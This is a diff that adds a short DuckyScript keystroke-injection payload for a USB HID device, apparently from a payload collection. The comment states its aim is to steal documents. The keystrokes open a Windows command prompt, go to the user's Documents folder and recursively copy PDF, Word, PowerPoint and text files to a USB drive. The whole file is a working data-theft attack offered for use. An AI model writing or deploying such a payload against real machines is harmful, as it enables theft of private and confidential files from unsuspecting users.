@@ -1,0 +1,13 @@
+REM Recursively steal any and all PDFs, PPTs, DOC, DOCX, .TXT from the current Windows Users Documents, Desktop and Downloads directories
+
+DEFAULT_DELAY 20
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+STRING cd %USERPROFILE%\Documents
+ENTER
+REM CHANGE THE DESTINATION LOCATION TO A USB STICK
+STRING for /R %i in (*.pdf, *.docx, *.doc, *.ppt, *.txt) do xcopy /y "%i" "E:\"
+ENTER
